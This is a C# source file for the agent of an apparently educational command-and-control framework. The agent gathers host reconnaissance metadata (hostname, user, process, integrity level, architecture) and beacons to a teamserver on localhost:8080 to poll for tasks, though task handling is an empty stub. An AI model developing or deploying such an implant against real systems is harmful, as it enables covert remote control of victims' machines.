using Agent.Models;
using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading;


namespace Agent
{
    class Program
    {
        private static AgentMetadata _metadata; // set breakpoint at GenerateMetadata() > f10 aand check props in here
        private static CommModule _commModule;
        private static CancellationTokenSource _tokenSource; // can also use bools --  running is true or not

        static void Main(string[] args)
        {
            Thread.Sleep(20000); // wait for teamserver and listeners to start before agent commands

            GenerateMetadata();

            _commModule = new HttpCommModule("localhost",8080);
            _commModule.Init(_metadata);
            _commModule.Start();

            _tokenSource = new CancellationTokenSource();

            while (!_tokenSource.IsCancellationRequested)
            {
                if (_commModule.RecvData(out var tasks))
                {
                    // if have tasks then action tasks
                }
            }
        }

        public void Stop() 
        { 
            _tokenSource.Cancel();
        }

        // generate metadata
        static void GenerateMetadata()
        {
            var process = Process.GetCurrentProcess();
            var username = Environment.UserName;
            var integrity = "Medium";

            if (username.Equals("SYSTEM"))
                integrity = "SYSTEM";

            using (var identity = WindowsIdentity.GetCurrent()) {
                if (identity.User != identity.Owner) {
                    integrity = "High";
                }
            }

            _metadata = new AgentMetadata
            {
                Id = Guid.NewGuid().ToString(),
                Hostname = Environment.MachineName, // use dns lookup incase name hostname change (more reliable)
                Username = username,
                Processname = process.ProcessName,
                ProcessId = process.Id,
                Integrity = integrity,
                Architecture = Environment.Is64BitOperatingSystem ? "x64" : "x86"
            };
        }
    }
}
